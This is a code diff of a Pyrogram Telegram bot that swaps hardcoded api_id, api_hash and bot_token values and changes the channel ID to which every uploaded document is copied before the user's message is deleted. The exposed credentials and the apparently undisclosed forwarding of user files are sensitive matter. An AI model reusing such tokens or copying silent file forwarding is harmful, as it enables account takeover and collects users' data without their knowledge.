@@ -24,9 +24,9 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
 bot = Client(
     "bot",
-    api_id=28466214,
-    api_hash= "3f55d44aae0f6c72f0dd8855adeeb60f",
-    bot_token= "7387562785:AAEZdm4ruxYvgWXc8p_18gElnva2OnD1mac")
+    api_id=20088962,
+    api_hash= "257f47d347157555890a64b12bc0134f",
+    bot_token= "6786890612:AAEvELybEXn_j4qGnQAFdB8m9JDkgMW9uXk")
 
 
 @bot.on_message(filters.command(["start"]))
@@ -47,7 +47,7 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
        x = await input.download()
-       await bot.send_document(-1002179528570, x)
+       await bot.send_document(-1002428206937, x)
        await input.delete(True)
        file_name, ext = os.path.splitext(os.path.basename(x))
        credit = "MEDARN"
